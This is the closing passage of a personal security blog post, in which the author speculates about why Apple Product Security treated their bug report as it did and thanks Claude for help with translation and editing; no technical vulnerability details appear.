eyes of Apple Product Security.</li><li>There are criteria and/or random factors at play during bug report review that I can&rsquo;t even begin to imagine — in which case guessing is pointless.</li></ol><p>Whether any of these guesses is correct — who knows.</p><h1>Thanks</h1><p>English isn&rsquo;t my native language, so thanks to <a href=https://claude.ai>Claude</a> for the help with translating and editing this post.</p><p>Experience is what you get when you didn&rsquo;t get what you wanted. Thanks to Apple Product Security for the interesting experience — I&rsquo;ll definitely write a separate post about it and share what I took away.</p><p>And thanks to the reader who made it all the way through — for your patience.</p><p>So it goes.</p><div class=prev-next-post><a class=prev-post href=/hobo-bn-mcp-v1-1-0/><span class=meta>← Apr 16, 2026</span><br>HOBO BN MCP v1.1.0 released</a></div><div class=footer-line></div><div class=meta><p>This is a personal website, it is not affiliated with any franchise, brand, or organization. All opinions are the author’s own. Information is provided for educational and research purposes only; see the <a href=/disclaimer/>Disclaimer</a> for details. The website uses software, assets, and hosting listed on the <a href=/credits/>Credits</a> page.</p><div class=footer-menu><div>© <a href=/contact/>ALV!ST</a>, 2026</div><div class=footer-icons><div class=switch-theme-button><i class="fa-solid fa-lightbulb"></i></div><a href=/index.xml><i class="fa-solid fa-square-rss"></i></a></div></div></div></div><div id=dimmed>&nbsp;</div></body></html>
